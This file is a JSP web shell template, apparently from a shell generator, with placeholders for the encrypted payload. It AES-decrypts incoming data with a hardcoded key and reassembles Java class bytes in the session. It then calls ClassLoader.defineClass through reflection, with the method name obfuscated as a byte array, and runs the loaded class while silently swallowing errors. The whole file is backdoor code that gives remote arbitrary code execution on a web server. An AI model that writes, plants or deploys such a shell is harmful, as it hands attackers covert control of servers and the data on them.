<%@page import="java.util.*,javax.crypto.*"%>
<%
try{
    List l=new ArrayList<>();
    l.add(response);
    String k="cmd";
    String r="";
    {@getvalue}byte[] f={@decode};
    byte[] g;
    Cipher c=Cipher.getInstance("AES");
    c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES"));
    g=c.doFinal(f);
    String h=new String(g);
    if(java.util.regex.Pattern.matches("[\\w.]{1,40}@.+",h)){l.add(h.substring(h.indexOf('@')+1));
    Class.forName(h.substring(0,h.indexOf('@'))).newInstance().equals(l);
    return;
}
if(g[0]==-54&&g[1]==-2&&g[2]==-70&&g[3]==-66){
    session.setAttribute("k",g);
}
else if(session.getAttribute("k")!=null){
    byte[] t=(byte[])session.getAttribute("k");
    byte[] y=new byte[t.length+g.length];
    System.arraycopy(t,0,y,0,t.length);
    System.arraycopy(g,0,y,t.length,g.length);
    session.setAttribute("k",y);
}
byte[] u=(byte[])session.getAttribute("k");
java.lang.reflect.Method m=ClassLoader.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,67,108,97,115,115}),byte[].class,int.class,int.class);
m.setAccessible(true);
((Class)m.invoke(this.getClass().getClassLoader(),u,0,u.length)).newInstance().equals(l);session.setAttribute("k",null);}catch(Exception e){}%>